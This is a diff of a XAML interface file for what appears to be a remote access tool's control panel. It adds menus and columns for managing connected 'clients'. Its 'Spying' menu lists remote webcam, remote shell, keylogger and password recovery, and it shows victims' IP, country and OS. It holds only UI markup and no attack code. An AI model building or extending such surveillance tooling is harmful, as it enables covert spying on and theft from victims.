@@ -5,36 +5,48 @@
              xmlns:d="http://schemas.microsoft.com/expression/blend/2008" 
              xmlns:local="clr-namespace:MosaicServeur.Main"
              mc:Ignorable="d" 
-             Height="auto" Width="auto">
+             Height="auto" Width="auto" Background="Black">
     <Grid Background="White">
-        <ListView Name="lvClients">
+        <ListView Name="lvClients" Foreground="Black">
             <!--context  Menu-->
             <ListView.ContextMenu>
-                <ContextMenu Style="{x:Null}" Name="ZoneIformationList" StaysOpen="false" Background="WhiteSmoke">
+                <ContextMenu  Style="{x:Null}"  Name="ZoneIformationList" StaysOpen="false" Background="WhiteSmoke">
                     <ContextMenu.BitmapEffect>
                         <BitmapEffectGroup/>
                     </ContextMenu.BitmapEffect>
-                    <MenuItem  Style="{x:Null}" Header="System">
+                    <MenuItem Style="{x:Null}" Header="Manage">
+                        <MenuItem Style="{x:Null}"  Header="Uninstall Client"/>
+                        <MenuItem Style="{x:Null}" Click="CloseClientMenuItem" Header="Close Client"/>
+                    </MenuItem>
+                    <MenuItem Style="{x:Null}" Header="System">
                         <MenuItem Style="{x:Null}"  Click="SysInfoMenuItem" Header="System Information"/>
                         <MenuItem Style="{x:Null}"  Click="FileMgMenuItem" Header="File Manager"/>
                         <MenuItem Style="{x:Null}"  Click="TaskMgMenuItem" Header="Task Manager"/>
                         <MenuItem Style="{x:Null}"  Click="StartupMgMenuItem" Header="Startup Manager"/>
-                        <MenuItem Style="{x:Null}"  Click="RunasMenuItem" Header="Run As Admin"/>
+                        <MenuItem Style="{x:Null}" Click="RunasMenuItem" Header="Run As Admin"/>
                     </MenuItem>
-                    <MenuItem  Style="{x:Null}" Header="Spying">
-                        <MenuItem Style="{x:Null}"  Click="RdMenuItem" Header="Remote Desktop"/>
-                        <MenuItem Style="{x:Null}"  Click="RwMenuItem" Header="Remote Webcam"/>
-                        <MenuItem Style="{x:Null}"  Click="RsMenuItem" Header="Remote Shell"/>
-                        <MenuItem Style="{x:Null}"  Click="PrMenuItem" Header="Password Recovery"/>
-                        <MenuItem Style="{x:Null}"  Click="KlMenuItem" Header="Key Logger"/>
+                    <MenuItem Style="{x:Null}" Header="Spying">
+                        <MenuItem Style="{x:Null}" Click="RdMenuItem" Header="Remote Desktop"/>
+                        <MenuItem Style="{x:Null}" Click="RwMenuItem" Header="Remote Webcam"/>
+                        <MenuItem Style="{x:Null}" Click="RsMenuItem" Header="Remote Shell"/>
+                        <MenuItem Style="{x:Null}" Click="PrMenuItem" Header="Password Recovery"/>
+                        <MenuItem Style="{x:Null}" Click="KlMenuItem" Header="Key Logger"/>
+                    </MenuItem>
+                    <MenuItem Style="{x:Null}" Header="Fun Functions">
+                        <MenuItem Style="{x:Null}" Header="Open/Close driveCD"/>
+                        <MenuItem Style="{x:Null}" Header="MessageBox"/>
+                        <MenuItem Style="{x:Null}" Header="Hide Screen"/>
+                        <MenuItem Style="{x:Null}" Header="Play Song"/>
+                        <MenuItem Style="{x:Null}" Header="Remote Chat"/>
                     </MenuItem>
                 </ContextMenu>
             </ListView.ContextMenu>
             <ListView.View>
-                <GridView x:Name="test">
-                    <GridViewColumn Header="Ip Address" DisplayMemberBinding="{Binding Ip}"/>
+                <GridView>
+                    <GridViewColumn Header="Client Identifier" DisplayMemberBinding="{Binding Identifier}" />
+                    <GridViewColumn Header="Ip Address" DisplayMemberBinding="{Binding Ip}" />
                     <GridViewColumn Header="Name" DisplayMemberBinding="{Binding Name}"/>
-                    <GridViewColumn Header="Account Type" DisplayMemberBinding="{Binding AccType}"/>
+                    <GridViewColumn Header="Account" DisplayMemberBinding="{Binding AccType}"/>
                     <GridViewColumn Header="Country" DisplayMemberBinding="{Binding Country}"/>
                     <GridViewColumn Header="Operating System" DisplayMemberBinding="{Binding Os}"/>
                     <GridViewColumn Header="Status" DisplayMemberBinding="{Binding Status}"/>
